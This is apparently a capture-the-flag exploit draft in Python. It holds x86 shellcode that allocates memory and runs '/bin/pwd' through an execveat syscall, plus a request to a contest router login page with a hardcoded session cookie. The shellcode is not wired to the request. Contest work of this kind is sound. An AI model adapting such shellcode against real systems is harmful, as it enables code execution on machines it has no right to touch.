import sys
from pwn import *
from base64 import b64decode, b64encode
import requests
import json

payload="""
    mov eax, 45
    mov ebx, 0
    int 0x80
    push eax 
    mov eax, 45
    pop ebx
    add ebx, 64
    int 0x80
    mov ecx, eax
    sub ecx, 64
    mov dword ptr [ecx+4], 0x6477702f
    mov dword ptr [ecx], 0x6e69622f
    mov [ecx+8], ecx
    add ecx, 8

    mov edx, ecx

    mov eax, 0x166
    mov ebx, 0
    mov ecx, [edx]
    xor esi, esi
    xor edi, edi
    int 0x80

"""
cookie = {'set-cookie': 'session=Avaev8thDieM6Quauoh2TuDeaez9Weja'}

#URL='127.0.0.1:8080'
URL1 = 'https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F'

s = requests.session()

r1 = s.post(URL1, cookies=cookie)
print (r1)
print (r1.text)


